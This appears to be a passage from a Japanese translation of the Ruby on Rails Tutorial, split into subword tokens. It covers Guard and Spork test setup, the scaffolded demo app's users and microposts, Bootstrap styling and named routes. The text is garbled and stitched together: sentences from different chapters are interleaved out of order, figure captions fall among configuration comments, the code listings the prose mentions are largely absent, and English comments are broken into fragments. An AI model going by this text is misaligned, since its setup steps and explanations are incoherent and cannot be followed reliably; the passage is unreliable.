▁ この節 の内容 は 先 進 的 ですが 、 その 分 、 本書 の 他の 内容 よりも 陳腐 化 し やすい ので 、 ご 利用 の システム で この節 の例 が 完全に 動作する とは 限 り ません 。 この 点 を ご 了 承 願 います 。 完全に 動作 させる には 、 Google で 最 新 情報を 検索 して 調 べ ること が 必要 になる でしょう 。
▁( 技術 的な 理由 により 、\ ko de { rails } コマンド だけ は 例外 です )。
▁ この節 の 作業 は かなり 厄 介 です 。 また 、 bundle ▁exec の 入力 を省略 する方法 を 2 とおり の 方法 で説明します 。
▁ RVM ▁ Bundler ▁ の 統合
▁最初に 、 お勧め の 方法 として RVM を使う 方法 を 紹 介 します 。 RVM は バージョン 1 . 11 以降 から Bundler と の 統合 が 含まれています 。
▁最初に 、 以下 に従って RVM のバージョン を 最 新 に します 。
▁ バージョン 1 . 11 . x 以降 の RVM を使用し ていれば 、 インストール された gem は自動的に 適切な Bundler の 環境で 実行されます ので 、 それ 以上 何も し なくても 以下のように bundle ▁exec を省略 して で 実行 できます 。
▁\ ko de { bundle ▁exec } を省略 すること が できました 。
▁この とおり に できた 場合は 、 この節 の 残 り は スキップ してください 。
▁ 一 見 奇 妙 ですが 、 実行 方法は 簡単 です 。
▁最初に 以下の 2 つの コマンド を実行します 。
▁次に 以下のコマンドを実行し ます 。
▁create ▁ db / migrate / 20 1 30 30 5 22 17 14 _ create _ users . rb
▁ 魔 法 のように 見え ます が 、 これらの コマンドで RVM と Bundler を 統合 できます 。 そして 、\ ko de { rake } や \ ko de { rspec } などの コマンド を 適切な 環境で 自動的に 実行 してくれます 。
▁\ ko de { . gitignore } ファイルに \ ko de { bundle r _ st ub s } を追加する 。
▁invo ke ▁ j builder _ scaffold _ controller
▁bundle r _ st ub s /
▁ 同様に \ ko de { rake } など も 以下のように 実行 できます 。
▁ 本書 の 以後 の 章では 、 この節 を スキップ する 方 に 配 慮 して 明示的に \ ko de { bundle ▁exec } を与えて コマンド を実行する ようにしています 。 もちろん 、 ご 利用 の システム が 適切に 設定 され ていれば 、 bundle ▁exec を省略 しても 構 いません 。
▁ bin st ub s オプション
▁\ ko de { rspec } コマンド は 、 テスト の たびに コマンドライン に移動し て 手動で コマンド を実行し なければならない 点が 面倒 です
▁この節では 、 テストを 自動 化 する \ href { https :// github . com / guard / guard } { Guard } という gem の 使い 方 を 紹 介 します 。
▁ Guard は ファイル システム の 変更を 監 視 し 、 たとえば \ ko de { static _ pages _ spec . rb } ファイル を変更する と 自動的に テスト を実行します 。
▁さらに 、\ ko de { home . html . erb } ファイル が変更され ると ▁\ ko de { static _ pages _ spec . rb } が自動的に 実行される ように Guard を設定する こともできます 。
▁ サンプルアプリケーションの \ ko de { Gemfile } に Guard を追加する 。
▁# ▁ U n comment ▁this ▁ line ▁on ▁ OS ▁X .
▁ ex ist ▁app / views / users
▁# ▁gem ▁' g row l ', ▁' 1 . 0 . 3 '
▁# ▁ U n comment ▁the s e ▁ line s ▁on ▁ L in u x .
▁# ▁gem ▁' lib not if y ', ▁' 0 . 8 . 0 '
▁# ▁ U n comment ▁the s e ▁ line s ▁on ▁ Windows .
▁# ▁gem ▁' rb - not if u ', ▁' 0.0 . 4 '
▁上のコード を使用する 際 は 、 test グループ 内で 自分の システム に 該当する 行 を 必ず コメント 解 除 してください
▁( Mac 用の G row l の 通知 機能 を使用する のであれば 、\ href { http :// g row l . info / d own load s } { G row l } を A p p le の A p p ▁S to re で 購 入 する必要があります 。 値 段 は 大 した ことはありません )。
▁次に \ ko de { bundle ▁install } を実行して gem を インストール します 。
▁ Guard を 初期化 し 、 RSpec と 一 緒 に 動作する ようにします 。
▁ W r it ing ▁ new ▁ Guard file ▁to ▁ / Users / mhartl / rails _ projects / sample _ app / Guard file
▁ rspec ▁ guard ▁ add ed ▁to ▁ Guard file , ▁f e e l ▁ free ▁to ▁ edit ▁it
▁ デフォルトの \ ko de { Guard file } に 追 記 する 。
▁\ ko de { require } が追加され ている ことに 注意 。
▁# ▁C us to m ▁Rails ▁Tutorial ▁ spec s
▁" spec / request s / authentication _ pages _ spec . rb "
▁ ここ まで 実行 すれば 、 以下のように \ ko de { rails ▁ s } コマンド ▁(\ ko de { rails ▁ server } コマンド の 短縮 版 ) ▁ を実行して ローカル Web サーバー を 起動 できるようになります 。
▁これは 、 テスト の パス に 失敗した 後に 、 他の 余 分 な テストが 実行 され ないように する ためのものです ▁( Re d - G re en - Re factor の サ イ ク ル を 早 め るため )。
▁これで \ href { http :// localhost :3000/ } { http :// localhost :3000/ } で デ モ アプリケーションを ブラウザ 表示 できるように な っている はずです 。
▁ 以上 の 準備 が 終 わ れば 、 以下の コマンドで \ ko de { guard } を 起動 できます 。
▁\ ko de { spec / routing } ディレクトリ が 見つからない という エラーが表示され た場合 は 、 以下のように 空 の ディレクトリ を 作る ことで 回 避 できます 。
▁\ ko de { bundle ▁exec ▁ rspec } を実行すると 、 テストが 開 始 される まで し ば ら く 時間 が か か ること に お 気 付き かもしれません 。 テストが い った ん 開 始 され れば すぐ に 終 了 します 。
▁これは 、 RSpec を実行する たびに Rails の 環境 全体 を 読み込み 直 す 必要がある ためです 。
▁\ emph { s p or k } は s p oo n - for k を 組み合わせ た 造 語 です 。
▁この プロジェクト 名 は 、\ href { http :// en . w ikipedia . org / wiki / P OS I X } { P OS I X } の \ href { http :// en . w ikipedia . org / wiki / F or k _ ( s of t w ar e _ development ) } { for k } における Spork の 用 法 を も じ った ものです 。
▁ Spork は 環境 を \ emph { 1 回 だけ } 読み込み 、 今後 実行 する テスト のための プロセス を 管理 します 。
▁ サンプルアプリケーションの \ ko de { Gemfile } に Spork を追加する 。
▁次に 、\ ko de { bundle ▁install } で Spork を インストール します 。
▁次に 、 Spork の設定 に bootstrap を指定します 。
▁\ ko de { Spork . pre for k } ブロック への 環境 読み込み を追加する 。
▁# ▁ R equ ir es ▁ support ing ▁ ruby ▁ file s ▁with ▁ custom ▁ match er s ▁and ▁ ma c r o s , ▁ e t c ,
▁# ▁in ▁ spec / support / ▁and ▁it s ▁ sub d ir e ct or ies .
▁# ▁C h ec k s ▁for ▁ p end ing ▁ migration s ▁ before ▁ tests ▁are ▁run .
▁# ▁I f ▁you ▁are ▁ not ▁ us ing ▁ActiveRecord , ▁you ▁c an ▁ remove ▁this ▁ line .
▁# ▁= = ▁ M ock ▁F r am e w or k
▁# ▁I f ▁you ▁ p ref er ▁to ▁use ▁ m o cha , ▁f l ex m ock ▁ or ▁ R R , ▁# ▁ un comment ▁the ▁app r o p ri at e ▁ line :
▁# ▁config . m ock _ with ▁: m o cha
▁{0} 図 2 . 4 {/0} {1} Users リソース ▁(\ href { http :// localhost :3000/ users }{/ users }) ▁ ページ の最初の 状態 。 \ href { http :// railstutorial . org / images / figure s / demo _ blank _ user _ index _ rails _ 3 - full . png }{( 拡大 ) }{/1}
▁# ▁config . m ock _ with ▁: f l ex m ock
▁# ▁config . m ock _ with ▁: r r
▁# ▁ Re m o ve ▁this ▁ line ▁if ▁you ' re ▁ not ▁ us ing ▁ActiveRecord < n > ▁# ▁ or ▁ActiveRecord ▁ fixtures
▁{0} 図 2 . 5 {/0} {1} 新規ユーザー 作成 ページ ▁(\ href { http :// localhost :3000/ users / new }{/ users / new })。 \ href { http :// railstutorial . org / images / figure s / demo _ new _ user _ rails _ 3 - full . png }{( 拡大 ) }{/1}
▁# ▁I f ▁you ' re ▁ not ▁ us ing ▁ActiveRecord , ▁ or ▁you ' d ▁ p ref er ▁ not ▁to ▁run ▁ each ▁of
▁# ▁your ▁ example s ▁with in ▁a ▁ tr an s action , ▁ remove ▁the ▁ following ▁ line ▁ or
▁# ▁as sign ▁false ▁in st e ad ▁of ▁true .
▁# ▁I f ▁true , ▁the ▁ base ▁class ▁of ▁ an on y m o us ▁ controllers ▁ will ▁be ▁in f er re d
▁# ▁ auto ma tic all y .
▁This ▁ will ▁be ▁the ▁ default ▁be ha v i or ▁in ▁f u t ur e ▁ version s ▁of
▁{0} 図 2 . 6 {/0} {1} ユーザー 表示 用の ページ ▁(\ href { http :// localhost :3000/ users /1 }{/ users /1 })。 \ href { http :// railstutorial . org / images / figure s / demo _ show _ user _ rails _ 3 - full . png }{( 拡大 ) }{/1}
▁# ▁ rspec - rails .
▁# ▁ R un ▁ spec s ▁in ▁ r and o m ▁ order ▁to ▁ s ur fa ce ▁ order ▁ de p end en c ies .
▁I f ▁you
▁{0} 図 2 . 7 {/0} {1} ユーザー 編集 用の ページ ▁(\ href { http :// localhost :3000/ users /1/ edit }{/ users /1/ edit })。 \ href { http :// railstutorial . org / images / figure s / demo _ edit _ user _ rails _ 3 - full . png }{( 拡大 ) }{/1}
▁# ▁ find ▁ an ▁ order ▁ dependency ▁and ▁ w an t ▁to ▁ debug ▁it , ▁you ▁c an ▁ fi x ▁the
▁{0} 図 2 . 8 {/0} {1} 情報 が 更新 された ユーザー 。 \ href { http :// railstutorial . org / images / figure s / demo _ update _ user _ rails _ 3 - full . png }{( 拡大 ) }{/1}
▁# ▁ order ▁ by ▁ pro v id ing ▁the ▁ s e ed , ▁ w h i ch ▁is ▁ p r in t ed ▁ after ▁ each ▁run .
▁# ▁-- s e ed ▁1 23 4
▁{0} 図 2 .9{/0} {1} 2 人 目 のユーザー が追加され た 一覧 ページ ▁(\ href { http :// localhost :3000/ users }{/ users })。 \ href { http :// railstutorial . org / images / figure s / demo _ user _ index _ two _ rails _ 3 - full . png }{( 拡大 ) }{/1}
▁# ▁This ▁ code ▁ will ▁be ▁run ▁ each ▁ time ▁you ▁run ▁your ▁ spec s .
▁ユーザーの 作成 、 表示 、 編集 方法 について説明し ました ので 、 今度は ユーザーを削除 してみましょう ▁( {0}{1} 図 2.1 0 {/1}{/0} )。
▁ Spork を 起動 する 前に 、 以下のように テストスイート を実行して 、 基 準 となる 実行 時間 を 測 定 します 。
▁{0}{1} 図 2.1 0 {/1}{/0} の ▁[ D es tr o y ] ▁ リンクをクリックすると ユーザーが 削除 され 、 index ページの ユーザー は 1 人 だけ になります
▁ 6 ▁ example s , ▁0 ▁ failure s
▁ re al 	 0 m 8 . 6 3 3 s
▁なお 、\ ref { sec : destroy ing _ users } では サンプルアプリケーション に ユーザーを削除 する 機能を 実装 し 、 管理 権限 ▁( admin ) ▁ を持つ ユーザー 以外 は 削除 を 実行 できない ように 制限 を かけ ます 。
▁ user 	 0 m 7 . 2 4 0 s
▁{0} 図 2.1 0 {/0} {1} ユーザーを削除 する 。 \ href { http :// railstutorial . org / images / figure s / demo _ destroy _ user _ rails _ 3 - full . png }{( 拡大 ) }{/1}
▁ s y s 	 0 m 1 . 06 8 s
▁上の 実行 結果 では 、 実際の テストは 1 / 10 秒 以下 で 実行されます が 、 テストスイート は 7 秒 以上 か か っています 。
▁ 実行 時間 の ス ピ ー ド アップ の ため 、 別の ターミナル ウ ィ ンド ウ を開いて アプリケーションの ルート ディレクトリ に移動し 、 以下のように Spork サーバー を 起動 します 。
▁{0} 図 2.1 1 {/0} {1} Rails における MVC 。 \ href { http :// railstutorial . org / images / figure s / mvc _ de t a il ed - full . png }{( 拡大 ) }{/1}
▁ U s ing ▁ RSpec
▁ L o ad ing ▁ Spork . pre for k ▁ block ...
▁ Spork ▁is ▁ read y ▁and ▁ list en ing ▁on ▁ 8 9 8 9 !
▁ re al 	 0 m 2 . 64 9 s
▁ user 	 0 m 1 . 2 59 s
▁ s y s 	 0 m 0 . 2 5 8 s
▁self を省略した 結果を リスト \ ref { code : rspec _ d rb } に示します 。
▁ 自動的に Spork を使う ための RSpec の設定 。
▁ Spork を使う 上で ひとつ 注意 があります 。 pre for k で 読み込む ファイル ▁( たとえば \ ko de { routes . rb }) ▁ が変更され た場合 、 Spork サーバーを再起動 して 新しい Rails の 環境 を 再度 読み込む 必要があります 。
▁ パス する は ず の テストが 失敗した場合 は 、\ text tt { Ctrl - C } で Spork サーバー を 停 止 して 再 起動 してください 。
▁\ ko de { class ▁User sController ▁< ▁ Application Controller } という 記 法 は 、 Ruby の \ emph { クラス } で の \ emph { 継 承 } の 使用 例 と な っている ことに も 注目してください
▁ Guard に Spork を 導入 する
▁ Spork は Guard と 併 用 すると 非常に 便利です 。 設定 を行う と 、 以下のように コマンド 上で 併 用 することができます 。
▁ これはリスト \ ref { code : s p or k _ guard file } で使用されていま した 。
▁ Spork 向け に 更新 した \ ko de { Guard file } 。
▁ 設定 が完了し たら 、 以下の \ ko de { guard } コマンドで Guard と Spork を 同時に 起動 します 。
▁ Guard は自動的に Spork サーバー を 起動 する ため 、 テスト 実行 時の オ ー バ ヘ ッ ド を 劇 的に 削 減 できます 。
▁ Guard 、 Spork 、 テスト 通知 機能 ▁( オプション ) ▁ を使用して 便利な テスト 環境 を 構 築 することで 、 テスト駆動開発 が や み つ き になる ことでしょう 。
▁S ublime ▁Text を使用し ていれば 、 エディタ の中から 直接 テストを 実行 できる 強力な ヘルパー コマンド を 利用 できます 。
▁この テスト 方法は 著者 の お 気 に 入 り です 。 最終的に 大 規 模 に ス ケ ー ル アップ する 可能性 のある 少 数 のテスト を 、 長 期 間 に 渡 って 実 施 したい ような 場合に 非常に 有 用 である ためです 。
▁ 参 考 : ▁\ href { https :// github . com / mhartl / rails _ tutorial _ s ublime _ text } { Rails ▁Tutorial ▁S ublime ▁Text } { p 1 } にある 説明 に従って 設定 することもできます 。
▁S ublime ▁Text を 再 起動 すると 、 以下のような コマンド が Ruby Test パ ッ ケ ー ジ によって 提供され ます 。
▁ 比 較 的 小 さ い プロジェクト であっても テストスイート の 実行 には 時間 が か か るため 、 テストを 一度 に 1 つ だけ 実行 したり 、 小 規 模 な テスト グループ だけ を実行し たり できる のは 大きな 長 所 です 。
▁ 従来 の テストでは 、 た った 1 つの テスト を実行する だけで も 、 Rails の 環境 に 匹 敵 する オ ー バー ヘ ッ ド が発生し てしまい ました 。 このため 、 上 述 のテスト 用 コマンド と Spork の 組み合わせ は 非常に 相 性 が 良い のです 。 Spork は 、 テスト を実行する たびに 発生 して いた テスト 環境 起動 による オ ー バー ヘ ッ ド を 取り 除 い てくれる ため 、 1 つの テスト を実行する たびに すべて をテストする の と 同 程 度 の オ ー バー ヘ ッ ド が発生する ようなこと が なくなります 。
▁ 個 人 的に は 、 以下の テスト 手順 が お勧め です 。
▁ ターミナル ウ ィ ンド ウ で Spork を 起動 する 。
▁ テストを 1 つ ▁( または 小 規 模 な テスト グループ ) ▁ を作成する 。
▁ Co m m and - S h if t - R コマンドで テストが 失敗する ことを確認する 。
▁ 対応する アプリケーション コード を作成する 。
▁ Co m m and - S h if t - E コマンドで 上の テスト と同じ テスト を実行し 、 今度は 成功 する ことを確認する 。
▁2 - 5 の 手順 を 繰り返す 。
▁ 中 継 点 ▁( コミット の 直 前 など ) ▁ に 到 達 した ら 、 ▁ コマンドライン で \ ko de { rspec ▁ spec / } を実行して テストスイート をすべて 実行 し 、 成功 する ことを確認する 。
▁S ublime ▁Text の中から テストが 実行 できる ことは もちろん 便利です が 、 場合によっては Guard の 方が 便利な ことも ある と思います 。 上の 手順 は 、 著者 が 個 人 的に 常 用 している テスト駆動開発 の テクニック として ご 紹 介 しました 。
▁ 通常 、 これらの アクション は 、 ページを 出力 せずに データベース 上の ユーザー情報 を 操作 します ▁( もちろん 、 ページを 出力 しても 良い のですが )。
▁ HTTP ▁ request メソッド の詳細については \ ref { sec : T D D } で説明します 。
▁ REST 理 論 そのもの は かなり 抽 象 的 ですが 、 Rails アプリケーション における REST とは 、 アプリケーション を構成する コンポーネント ▁( ユーザー や マイクロポスト など ) ▁ を 「\ emph { リソース }」 として モデル 化 すること を 指 します 。 これらの リソース は 、 リ レ ー シ ョ ナ ル データベースの \ href { http :// en . w ikipedia . org / wiki / Create , _ read , _ update _ and _ delete } { 作成 / 読み 取り / 更新 / 削除 ▁( Create / Re ad / U p date / D e let e : ▁C R U D ) ▁ 操作 } と 、 4 つの 基本的な \ href { http :// en . w ikipedia . org / wiki / HTTP _ request # Request _ method s } { HTTP ▁ request メソッド } ▁(\ text tt { POST } / \ text tt { GET } / \ text tt { PUT } / \ text tt { DELETE }) ▁ の 両方 に 対応 しています
▁ デ モ アプリケーションの ユーザー \ ko de { index } アクション を 整 理 した もの 。
▁\ ko de { index } アクションに \ ko de {@ users ▁= ▁User . all } という 行 があります ▁( 図 2.1 1 ▁ の 3 に相当 )。 これ によって 、 User モデル から すべての ユーザーの 一覧 を取り出し ▁( 4 ) 、\ ko de {@ users } という 変数 に保存 します ▁( 5 )。 なお 、 @ users は 「 あ っ と ▁ ゆ ー ざ ー ず 」 と 発 音 します 。
▁ デ モ アプリケーションの User モデル 。
▁ 厳 密 には これは 正しい 表現 ではありません 。 という の も 、 scaffold のコード には 初 歩 的な テストが 一 応 含 まれ ている からです 。 ただ 、 scaffold のテスト コードは 読み づ ら く 、 柔 軟 性 も ありません 。 さらに データ の 検証 、 ユーザー 認 証 、 その他 に 必要な 独 自 テスト も 含 まれ て いません 。
▁Rails の RESTful 構造 を 身 体 に 叩 き こ む には 、 繰り返し 学ぶ の が 一 番 です 。 Users リソース と Microposts リソース の 構造 の 類 似 点 を理解する ことが 、 この章 の 主要な 目的 です
▁$ ▁ rails ▁ generate ▁ scaffold ▁ Micropost ▁ content : string ▁ user _ id : integer
▁create ▁ db / migrate / 20 1 30 30 7 00 5 5 28 _ create _ microposts . rb
▁ ex ist ▁app / views / microposts
▁\ href { http :// localhost :3000/ microposts / new }{/ microposts / new } ページを ブラウザで 開 き 、 新しいマイクロポスト の 情報を 入力 して マイクロポストを いくつか 作成 してみましょう ▁( {1}{2} 図 2.1 2 {/2}{/1} )。
▁{0} 図 2.1 2 {/0} {1} 新しいマイクロポスト の作成 ページ ▁(\ href { http :// localhost :3000/ microposts / new }{/ microposts / new })。 \ href { http :// railstutorial . org / images / figure s / demo _ new _ micropost - full . png }{( 拡大 ) }{/1}
▁ 結果 は {0}{1} 図 2.1 3 {/1}{/0} の よう になるはずです 。
▁{0} 図 2.1 3 {/0} {1} マイクロポストの index ページ ▁(\ href { http :// localhost :3000/ microposts }{/ microposts })。 \ href { http :// railstutorial . org / images / figure s / demo _ micropost _ index _ rails _ 3 - full . png }{( 拡大 ) }{/1}
▁{0}{1} 図 2.1 4 {/1}{/0} に示した とおり 、 マイクロポスト の内容 が 長 すぎる という \ emph { エラーメッセージ } が Rails によって 表示 されます
▁{0} 図 2.1 4 {/0} {1} マイクロポストの 作成 に 失敗した場合 の エラーメッセージ 。 \ href { http :// railstutorial . org / images / figure s / micropost _ length _ error _ rails _ 3 - full . png }{( 拡大 ) }{/1}
▁" 20 1 3 - 0 3 - 06 ▁0 2 : 3 7 : 3 7 ", ▁ updated _ at : ▁" 20 1 3 - 0 3 - 06 ▁0 2 : 3 7 : 3 7 "> , ▁#< Micropost ▁id : ▁ 2,
▁( 最後の 行 のように ex it を実行すると rails ▁console を 終 了 できます 。 多くの システム では 、 Ctrl - d キー を 押 して 終 了 することもできます 。 )
▁\ ko de { first _ user . microposts } という コード を実行すると 、 その ユーザーに 関連付けられている マイクロポスト にアクセス できます 。 このとき Active ▁Record は 、\ ko de { user _ id } が \ ko de { first _ user } の id ▁( ここでは \ ko de {1} ) ▁ と 等 しい マイクロポストを 自動的に 返します 。
▁最後に 、 デ モ アプリケーションで 使用している Rails の コントローラ と モデルの クラス 階層 について 簡単に 解説します 。
▁\ ko de { User } クラスにおける継承 。
▁\ ko de { Micropost } クラスにおける継承 。
▁{0}{1} リスト 2.1 7 {/1}{/0} を見ると 、\ ko de { Application Controller } 自身 は \ ko de { ActionController :: Base } を継承し ています 。 これは Rails の Action ▁P ack という ライブラリ が 提供し ている 、 コントローラ 用の ベース クラス です 。
▁\ ko de { Users Controller } クラスにおける継承 。
▁\ ko de { Microposts Controller } クラスにおける継承 。
▁\ ko de { Application Controller } クラスにおける継承 。
▁ モデルの 継 承 関係 と同様に 、 Users コントローラ も Microposts コントローラ も 最終的に は \ ko de { ActionController :: Base } を継承し ており 、 モデル オブジェクトの 操作 、 イン バ ウ ンド HTTP ▁ request の フィルタ 、 ビュー を HTML として 出力 する などの 多 彩 な 機能を 実行 できる ようになっています 。
▁ Microposts リソース の 説明 が 終わり ました ので 、 ここで リポジトリ を GitHub に 登録 しましょう 。
▁この コマンド を実行すると 、 先ほど 定義 した ユーザー と マイクロポストの データモデル を使って 、 Heroku 上の データベース が 更新 されます 。
▁ つ い に Rails アプリケーションを 最 後 まで 完成 させ ました 。
▁ この章 で作成した デ モ アプリケーション には 良い ところ もあります が 、 さまざまな 弱 点 もあります 。
▁“ Home ” ▁ や ▁“ About ” ▁ のような 静的なページ がない
▁ サインイン できない
▁ テスト駆動開発 が行われ ていない
▁この 章では 、 アプリケーションに \ emph { Bootstrap } フレームワーク を 組み込み 、 そして 、 カスタム スタイル を追加します
▁\ emph { Rails チュートリアル } は Web 開発 のための 本 であり 、 Web デザイン の 本 ではありません が 、 だ から と い って \ emph { 何 の スタイル も ない } 寒 々 しい 外 観 の アプリケーションで い つ まで も 作業 を 続けて いる と 憂鬱 になってしまい ます 。 そこで 、 この章 では レイアウト に いくつかの 構造 と CSS を与えて 最 小 限 の スタイル を追加します 。 カスタム CSS ルール の 他 に 、 Twitter 社 による オープン ソース の Web デザイン フレームワーク である \ href { http :// get bootstrap . com /}{ Bootstrap } を 利用 します 。
▁\ ko de { header } タグ の 内 側 には 2 つの \ ko de { div } タグ があります 。
▁ この場合 、 それぞれの \ ko de { div } には CSS クラス が与えられ ています 。
▁\ ko de { header } タグ の クラス と同様に 、 これらの クラス も Bootstrap において 特別な 意味 を 持 っています 。
▁ div に 続いて 、 埋め込み Ruby コードが 出 現 します 。
▁ 正 式 には ここでは 不要です が 、\ ko de { n a v } タグ は その 内 側 が ナビゲーション リンク である という 意 図 を 伝 え る 役 割 があります 。
▁\ ko de { ul } タグ の \ ko de { n a v } と \ ko de { pull - right } クラス は 、 Bootstrap において 特別な 意味 を 持 ち ます 。
▁Rails が この レイアウト を 処理 し 、 埋め込み Ruby を 評価 すると 、 上の リスト は 以下 に置き 換 わ ります 。
▁\ ref { sec : layouts } で 学 んだ ように 、\ ko de { yield } メソッドは Web サイトの レイアウト に ページ ご と の内容 を 挿 入 します 。
▁ 今後 登 場 する スタイル 要素 を 利用 できるように するために 、\ ko de { home . html . erb } ビュー に 特別な 要素 を いくつか 追加 します ( リスト \ ref { code : signup _ button })。
▁(\ ko de { m k d ir } コマンド や G U I ベース の ファイル マ ネ ー ジ ャ を使用して この ディレクトリ を作成する 必要がある こともあります )。
▁ Asset ▁Pipeline で L E S S を使う こともできます 。 詳 細 は \ href { http :// ruby gem s . org / gem s / less - rails - bootstrap }{\ text tt { less - rails - bootstrap } ▁gem } を参照してください 。
▁次に 、 開発 中 の アプリケーションに 変更を 反 映 するために 、 Web サーバーを再起動 します
▁( ほとんど の システム では 、 最初に \ text tt { Ctrl - C } を 押 下 して サーバー を 停 止 し 、 次に \ ko de { rails ▁ server } コマンド を実行する ことで サーバーを再起動 できます )。
▁ アプリケーションに カスタム CSS を追加する ための 第 一 段 階 として 、 カスタム CSS を 格 納 するための 以下の ファイルを 開 きます 。
▁app / assets / stylesheets
▁self を省略した 結果を リスト \ ref { code : bootstrap _ css } に示します 。
▁( 場合によっては 、\ text tt { Ctrl - C } を使用して ローカル の Web サーバーを再起動 する 必要がある かもしれません 。
▁また 、 ス ク リ ー ン シ ョ ッ ト では Bootstrap ▁2 . 0 を使用しています が 、 この チュートリアル では Bootstrap ▁2 . 3 を 使用している ので 、 外 観 に 多 少 の違い が 生じる 可能性 がある ことを ご 了 承 ください 。
▁ これら について 心 配 する必要はありません 。 )
▁( デフォルトの n a v bar の 色 は 、 Bootstrap ▁2 . 0 から 2.1 に 変 わ った ときに 変更 された ため 、 現在の 淡 色 の代わりに ダ ー ク な 色 調 に したい場合は \ ko de { n a v bar - inverse } クラス を使用する 必要があります )。
▁ これはリスト \ ref { code : stylesheets _ partial } で使用されていま した 。
▁これらの ディレクトリ 中 の ファイルは 、 http :// example . com / stylesheets のような リクエスト によって自動的に 配信 されます 。 これは 3.0 以降 も 同様 です 。
▁Rails ▁ 3.1 以降 では 、 静 的 ファイルを 目的 別 に 分 類 する 、 標準的な \ emph { 3 つの } ディレクトリ が 使用される ようになりました 。 Rails ▁4.0 でも 同様 です 。
▁ images ▁ javascripts ▁ stylesheets
▁\ href { http :// ruby . railstutorial . org / ruby - on - rails - tutorial - book }{\ emph { Ruby ▁on ▁Rails チュートリアル } } へ よう こ そ 。
▁\ ref { sec : e m b ed de d _ ruby } では 最初に ER b を 、\ ref { sec : sass } では Sass を それぞれ 扱 い ました 。
▁ 小さな ス ター ト アップ から 巨 大 企 業 まで 、 多くの 組 織 が ▁Rails ▁ を使っています 。 例 えば 、\ href { http :// 3 7 sign al s . com /}{ 3 7 sign al s } ▁ や ▁\ href { http :// github . com /}{ GitHub }、\ href { http :// sh o p if y . com /}{ S h o p if y }、\ href { http :// sc ri b d . com /}{ S c ri b d }、\ href { http :// t w it ter . com /}{ Twitter }、\ href { http :// d is n e y . com /}{ D is n e y }、\ href { http :// h ul u . com /}{ H ul u }、\ href { http :// y e ll o w pages . com /}{ Y e ll o w ▁P age s } ▁ など 、\ href { http :// rubyonrails . org / application s } { Ruby ▁on ▁Rails ▁ を 使っている サイトの リスト } は 増え る 一方 です 。
▁ 実際 、 Bootstrap フレームワーク では 、 多くの 色 に対して 変数 名を 定義 しています 。 定義されている 変数 は Bootstrap ページの 「\ href { http :// bootstrap doc s . com / v 2 . 0 . 4 / doc s / less . html } { L E S S 変数 一覧 }」 で 参 照 することができます 。
▁この Web サイト では 、 Sass ではなく L E S S を使って 変数 が 定義 されています が 、\ text tt { bootstrap - sass } という gem を使用すれば 、 Sass でも 同様 の 変数 が 使えるようになります 。
▁\ href { http :// p e e p code . com /}{ P e e p Co de } : ▁ 質 の 高 い 商 用の スクリーンキャスト
▁\ href { http :// www . code s ch o ol . com /}{ Co de ▁S ch o ol } : ▁ プログラミング を 対 話 的に 学習 できる コース
▁しかし 、 上の 記 法 は Rails 流 ではありません 。
▁\ href { http :// rails casts . com /}{ RailsCast s } ▁( Ryan ▁B at es ) : ▁ さ っ き も ▁\ href { http :// rails casts . com /}{ RailsCast s } ▁ を 紹 介 しました っ け ?
▁その ぐらい ▁\ href { http :// rails casts . com /}{ \ emph { RailsCast s } } ▁ は お勧め です 。
▁ Contact ページの テストを リスト \ ref { code : contact _ page _ test } に示します 。 これは 単 に リスト \ ref { code : pages _ controller _ spec _ title } で 使用されている テスト の パターン に 従 った ものです 。
▁ Contact ページ のテスト 。
▁ URL に対するテスト が でき あ が った ので 、 それら を 実際に 利用 できるように しましょう 。
▁ デフォルトの ルート ファイル の内容 を見 てみると 、 かなり 乱 雑 になっています 。 しかし 、 それら はすべて コメントアウト された ルート マッピング の例 であり 、 必要な 乱 雑 さ です 。
▁ 時間 のある ときに この ルート マッピング を 読んで み る ことをお勧めします 。 また 、 より 詳 細 な ルーティング の 扱 い については Rails ▁ G u id es の 「\ href { http :// guides . rubyonrails . org / routing . html } { Rails における 外部 から 内部 への ルーティング } ▁( 英語 )」 を参照 する ことをお勧めします 。
▁ 名前付きルート を定義する ため 、 以下のような ルール を 置き換え ます 。
▁この ルーティング は 、\ ko de { / help } ▁(\ text tt { GET } リクエスト に応答する ) ▁ で 有効な ページ と 、 その ページ への パス を返す \ ko de { help _ path } という名前の 名前付きルート の 両方 を 準備 します
▁( 実際には 、\ ko de { match } の 箇所 に \ ko de { get } を使用して も 同じ 名前付きルート になります が 、\ ko de { match } を 利用 する 方が より Rails の 慣 例 に従って います )。
▁ これはリスト \ ref { code : root _ route } で使用されていま した 。
▁ 変更 前 の 以下のコード は 、 より 明 示 的 で した 。
▁ このコード も 同じ ページ へ た ど り 着 きます が 、\ ko de { / about } の 方が 簡潔 です 。
▁さらに 前 述 した ように 、\ ko de { match ▁ ’ / about ’ } という コード は自動的に コントローラ と ビュー で使用する \ emph { 名前付きルート } を生成します 。
▁なお 、\ emph { Rails チュートリアル } では 、\ ko de { path } 書 式 を使用する 一般的な 規 約 に従い 、 リダイレクト の場合 のみ \ ko de { url } 書 式 を使用します 。
▁これは 、 HTTP 標準 では 技術 的に リダイレクト 後に フル URL が 要求 される ためです 。 ただし 、 ほとんど の ブラウザで は どちら の 方法 でも 動作します 。
▁ RubyGems が インストール されていない 場合は 、\ href { http :// ruby f org e . org / f r s / ? group _ id = 12 6 } { RubyGems を ダウンロード } して 解 凍 し 、 作成された \ ko de { ruby gem s } ディレクトリ で セットアップ プログラム を実行して ください 。
▁ ルーティング が 定義された ので 、 Help 、 About 、 Contact ページの テストは パス するはずです 。
▁これで 、 失敗する テストは Home ページを 残 す だけ と なりました 。
▁ Home ページ への ルート マッピング を作成する 際に 、 以下のような コードを 使用 \ emph { すること も 一 応 可能です } 。
▁ ルート ▁( root ) ▁ への ルーティング を定義する 、 コメント 内の ヒント 。
▁ 特定の バージョンの Rails イン スト ー ラ へのリンク を作成して も ら え る よう 、 現在 Engine ▁ Y ar d に 働 き かけ ています 。
▁また 、 URL ヘルパー に 以下の 設定 を 与え ます 。
▁これで 静的ページ への ルート が すべて 動作 し 、 テスト も すべて パス するはずです 。
▁ 後 は 、 レイアウト の リンクを これらの 名前付きルート で 埋 め れば よい のです 。
▁その ためには 、\ ko de { link _ to } メソッドの 2 番目の 引数に 適切な 名前付きルート を指定する 必要があります 。
▁ ところで 、 実際に レイアウト 上 に リンク が存在する かどうかを まだ テスト していません が 、 テスト 方法 の ヒント として 、「 名前付きルート が 定義 されて い なければ テストは 失敗する 」 という ことに注目してください 。
▁このコードは リスト \ ref { code : static _ page _ routes } で使用されていま した 。 もうひとつ 、
